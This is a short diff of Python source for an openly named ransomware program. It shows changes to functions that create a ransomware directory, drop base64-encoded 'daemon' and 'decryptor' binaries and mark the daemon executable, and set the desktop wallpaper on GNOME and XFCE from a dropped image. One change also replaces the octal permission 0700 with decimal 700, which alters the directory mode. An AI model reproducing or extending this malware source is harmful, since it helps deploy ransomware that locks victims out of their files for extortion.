@@ -92,7 +92,7 @@ def menu():
 
     # create ransomware directory 
     try:
-        os.mkdir(variables.ransomware_path, 0700)
+        os.mkdir(variables.ransomware_path, 700)
     except OSError:
         pass
         
@@ -162,10 +162,10 @@ def menu():
 def drop_daemon_and_decryptor():
     
     with open(variables.ransomware_path + "/decryptor", 'wb') as f:
-        f.write(base64.b64decode(decryptor))
+        f.write(base64.b64decode(variables.decryptor))
 
     with open(variables.ransomware_path + "/daemon", 'wb') as f:
-        f.write(base64.b64decode(daemon))
+        f.write(base64.b64decode(variables.daemon))
 
     os.chdir(variables.ransomware_path)
     os.system('chmod +x daemon')
@@ -178,7 +178,7 @@ def drop_daemon_and_decryptor():
 
 def change_wallpaper():
     with open(variables.ransomware_path + "/img.png", 'wb') as f:
-        f.write(base64.b64decode(img))
+        f.write(base64.b64decode(variables.img))
     gnome = 'gsettings set org.gnome.desktop.background picture-uri {}'.format(variables.ransomware_path + "/img.png")
     
     xfce = '''xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s "{}" '''.format(variables.ransomware_path + "/img.png")
